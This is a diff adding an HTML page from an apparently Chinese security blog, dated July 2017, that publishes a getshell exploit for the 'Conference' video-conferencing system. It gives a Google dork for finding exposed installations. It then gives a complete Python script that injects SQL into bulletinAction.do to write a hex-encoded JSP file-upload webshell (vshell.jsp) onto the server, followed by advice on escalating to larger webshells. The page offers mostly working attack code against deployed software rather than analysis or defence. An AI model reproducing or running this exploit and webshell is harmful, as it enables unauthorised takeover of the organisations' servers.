@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<head>
+
+	<title>poions blog</title>
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link href="/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/templatemo_style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+	<div class="templatemo-logo visible-xs-block">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg logo-left-container">
+			<h1 class="logo-left">Black</h1>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg logo-right-container">
+			<h1 class="logo-right">White</h1>
+		</div>
+	</div>
+	<div class="templatemo-container">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg left-container">
+			<h1 class="logo-left hidden-xs margin-bottom-60">Black</h1>
+			<div class="tm-left-inner-container">
+				<ul class="nav nav-stacked templatemo-nav">
+				  <li><a href="\index.html"><i class="fa fa-home fa-medium"></i>首页</a></li>
+				  <li><a href="\web.html" class="active"><i class="fa fa-shopping-cart fa-medium"></i>Web安全</a></li>
+				  <li><a href="\ctf.html"><i class="fa fa-send-o fa-medium"></i>CTF</a></li>
+				  <li><a href="\zawen.html"><i class="fa fa-comments-o fa-medium"></i>杂文</a></li>
+				  <li><a href="\contact.html"><i class="fa fa-envelope-o fa-medium"></i>联系方式</a></li>
+				</ul>
+			</div>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg right-container">
+			<h1 class="logo-right hidden-xs margin-bottom-60">White</h1>
+			<div class="tm-right-inner-container">
+				<h1 class="templatemo-header"><strong>视讯会议系统getshell</strong></h1>
+				<article class="templatemo-item">
+				 </br>
+						<p>
+						Conference 视讯会议系统漏洞，利用该系统存在的注入漏洞，进行命令执行从而写入webshell获得服务器权限。
+						
+						</p>
+								<div> 在google上利用搜索引擎对该系统进行查找：intitle:Conference 视讯会议系统</div>
+							
+						<img src="images\20170725154845.jpg" alt="frist" class="img-thumbnail"></br>
+				</br>
+				<div class="">python exp:</div>
+				</br>
+							<pre>
+import requests
+import json
+import sys
+def post_shell(url):
+    headers = {'content-type': 'application/json'}
+    rqs = '/Conf/jsp/systembulletin/bulletinAction.do?operator=details'
+    opq = url+rqs
+    poc = ("sysId=-1 union select 0x3c25402070616765206c616e67756167653d226a617661222070616765456e636f64696e673d2267626b22253e203c6a73703a6469726563746976652e7061676520696d706f72743d226a6176612e696f2e46696c65222f3e203c6a73703a6469726563746976652e7061676520696d706f72743d226a6176612e696f2e4f757470757453747265616d222f3e203c6a73703a6469726563746976652e7061676520696d706f72743d226a6176612e696f2e46696c654f757470757453747265616d222f3e203c68746d6c3e2020203c686561643e2020202020203c7469746c653e5c0f9a6c3c2f7469746c653e203c6d65746120687474702d65717569763d226b6579776f7264732220636f6e74656e743d225c0f9a6c223e203c6d65746120687474702d65717569763d226465736372697074696f6e2220636f6e74656e743d225c0f9a6c223e2020203c2f686561643e2020203c25202020696e7420693d303b20202020537472696e67206d6574686f643d726571756573742e676574506172616d65746572282261637422293b202020206966286d6574686f64213d6e756c6c26266d6574686f642e657175616c73282275702229297b2020202020537472696e672075726c3d726571756573742e676574506172616d65746572282275726c22293b2020202020537472696e6720746578743d726571756573742e676574506172616d6574657228227465787422293b20202020202046696c6520663d6e65772046696c652875726c293b202020202020696628662e6578697374732829297b20202020202020662e64656c65746528293b2020202020207d2020202020207472797b202020202020204f757470757453747265616d206f3d6e65772046696c654f757470757453747265616d2866293b202020202020206f2e777269746528746578742e67657442797465732829293b202020202020206f2e636c6f736528293b2020202020207d636174636828457863657074696f6e2065297b20202020202020692b2b3b2020202020202020253e20202020202020204e0a4f204e0d6210529f20202020202020203c2520202020202020207d202020202020207d20202020202020696628693d3d30297b20202020202020253e20202020202020204e0a4f206210529f2020202020203c2520202020207d20202020253e2020202020203c626f64793e203c666f726d20616374696f6e3d273f6163743d75702720206d6574686f643d27706f7374273e2020203c696e7075742073697a653d22313030222076616c75653d223c253d6170706c69636174696f6e2e6765745265616c5061746828222f222920253e22206e616d653d2275726c223e3c62723e2020203c746578746172656120726f77733d2232302220636f6c733d22383022206e616d653d2274657874223e8fd951999a6c76844ee378013c2f74657874617265613e3c62723e2020203c696e70757420747970653d227375626d6974222076616c75653d22757022206e616d653d2274657874222f3e203c2f666f726d3e2020203c2f626f64793e203c2f68746d6c3e,'','','',''into dumpfile '../../management/webapps/root/vshell.jsp'%23'")
+    urlcode = requests.post(opq,headers=headers,params=poc)
+def get_url(url):
+    lujing = '/vshell.jsp'
+    shellcode = url+lujing
+    r = requests.get(shellcode)
+    if r.status_code == 200:
+        print 'shell:'+shellcode
+    else:
+        print 'not shell'
+if __name__=='__main__':
+    if len(sys.argv) == 2:
+        post_shell(sys.argv[1])
+        get_url(sys.argv[1])
+    else:
+        sys.exit(0)
+</pre>
+
+						<br>
+						</br>
+			<strong><span>获得一个小马地址：</span></strong>
+
+			<img src="images\20170725160151.jpg" alt="frist" class="img-thumbnail">
+
+
+		<!-- 文章修改 -->
+
+
+		<!--			<img src="images\chwww.jpg" alt="frist" class="img-thumbnail">  -->
+		<p> 关注这个漏洞许久，网上还有不少公司集团使用这一款视讯系统.上面给出的exp，通过对注入对系统进行写入文件，初期发现直接写会写不成功，后来进行不断尝试发现需要进行编码。
+		编码后写入的字符串也不能超过位数，超过也会写不成功，因此将一个小马写入符合其长度规范，后续渗透可以通过小马写入大马或一句话木马。由于是jsp，获取的webshell权限往往比较高。
+		</p>
+			</br>
+			</br>
+						by<span class="blue">：2017年7月26号</span><span class="green">下午2点钟</span>.</p>
+				<br/>
+
+
+
+		<!-- 文章修改 -->
+
+
+
+				</footer>
+			</div>
+		</div> <!-- right section -->
+	</div>
+</body>
+</html>
